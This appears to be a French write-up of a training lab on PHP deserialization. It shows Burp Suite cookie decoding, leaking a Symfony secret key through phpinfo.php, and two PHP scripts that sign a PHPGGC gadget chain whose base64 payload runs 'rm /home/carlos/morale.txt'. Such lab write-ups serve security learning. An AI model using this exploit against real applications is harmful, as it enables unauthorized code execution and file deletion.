# PHP deserialization with pre-built gadget chain
- En informatique, la sérialisation est le codage d'une information sous la forme d'une suite d'informations plus petites pour, par exemple, sa sauvegarde ou son transport sur le réseau. Ce qu'on va faire là c'est l'inverse de ce procédé. On va décoder des informations appartenant au système Symfonie.<br/>
## Exploitation
- En premier temps je lance Burpsuite et je le laisse tourner en arrière-plan pendant que je fais ma prochaine manipulation.<br/>
- Ensuite je me login pour générer des requêtes. L'énnonce nous indique que le login par défaut est "wiener" et "peter".<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770030149490966548/unknown.png"/><br/><br/>
- Je check l'historique des requêtes et je sélectionne l'index où le procédé du login a été sérialisé.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770031231060017192/unknown.png?width=1195&height=890"/><br/><br/>
- Ici on constate que le token de la session "Wiener:Peter" a été encodé en URL. Par conséquent j'envoie la partie codée vers le décodeur de Burpsuite.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770032331141677066/unknown.png"/><br/><br/>
- Je décode en URL et hop, la section est plus claire.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770033158891503656/unknown.png"/><br/><br/>
- On voit qu'il y a une partie codée en base64, je la décode.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770033590125199370/unknown.png"/><br/><br/>
- Passons, je vais garder tout ça pour plus tard. Ce qui m'intéresse maintenant c'est de savoir sous quel framework est utilisé par le serveur-web.<br/>
- Pour ce faire j'envoie la requête vers le repeater et je supprime la partie "7D" du % qui est en réalité une accolade mais encodé en URL pour par conséquent générer une erreur par le framework utilisé.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770310427426684979/unknown.png"/><br/><br/>
- On sait maintenant que le framework Symfonie de la version 4.3.6 est utilisé.<br/>
- Maintenant on check les ressources du site-web pour trouver le fichier PHP de configuration.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770311153867554927/unknown.png"/><br/><br/>
- Le fichier phpinfo.php existe donc je le renvoie vers le repeater.<br/>
- Il me faut le SECRET_KEY pour créer mon gadget donc je cherche la keyword et je tombe sur ça.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770312787452493834/unknown.png?width=1095&height=630"/><br/><br/>
- Maintenant je passe au développement du gadget chain.<br/>
```PHP
<?php 

	$object = "";

	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
	
	echo $payload = urlencode('{"token":"' . $object . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

?>
```
<br/>
- Pour créer l'object (RCE) qu'on voudra faire exécuter au serveur-web. Je fais l'usage de PHPGGC, mais qu'est-ce que c'est au juste ?<br/>
- PHPGGC est une bibliothèque de payloads unserialize() et un outil qui les génère. Lorsqu'il y a une désérialisation sur un site Web dont vous n'avez pas le code, ou simplement lorsque vous essayez de créer un exploit, cet outil vous permet de générer la payload sans avoir à passer par les étapes fastidieuses de recherche de gadgets et de combinaison. Il peut être vu comme l'équivalent de ysoserial ou même frohoff, mais ce pour le langage PHP. Actuellement, l'outil prend en charge les frameworks: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii et ZendFramework.<br/>
- La source se trouve ici : https://github.com/ambionics/phpggc.<br/>
- En faisant attention, on a pu voir que le serveur-web utilisait le framework Symfony donc ça tombe bien vu que PHPGGC accepte ce framework.<br/>
- La version du framework était 4.3.6.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770318095209725952/unknown.png"/><br/><br/>
- L'énoncé nous dit qu'on doit supprimer le fichier morale.txt qui se trouve dans le répertoire "/home/carlos".<br/>
- J'ai plus qu'à générer la payload en ajoutant la commande de supprésion de fichier tout en implémentant la payload en base64.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770319551245582336/unknown.png"/><br/><br/>
- Pour que le résultat soit en une ligne faites "base64 -w 0".<br/><br/>
```
<?php 

	$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";

	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
	
	echo $payload = urlencode('{"token":"' . $object . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

?>
```
<br/>
- Notre gadget chain est enfin terminé, maintenant on fait exécuter le fichier .php, qu'importe le serveur, personnellement je l'héberge dans mon réseau local.<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770322237214818304/unknown.png?width=1440&height=394"/><br/><br/>
- Hop, on a notre gadget chain. Pour la mettre en oeuvre on a plus qu'à C/C notre payload dans l'index qu'on a redirigé vers le repeater et on a notre RCE ;].<br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770323225527582750/unknown.png?width=921&height=630"/><br/><br/>
<img src="https://media.discordapp.net/attachments/768928242467340328/770323394004123648/unknown.png"/>
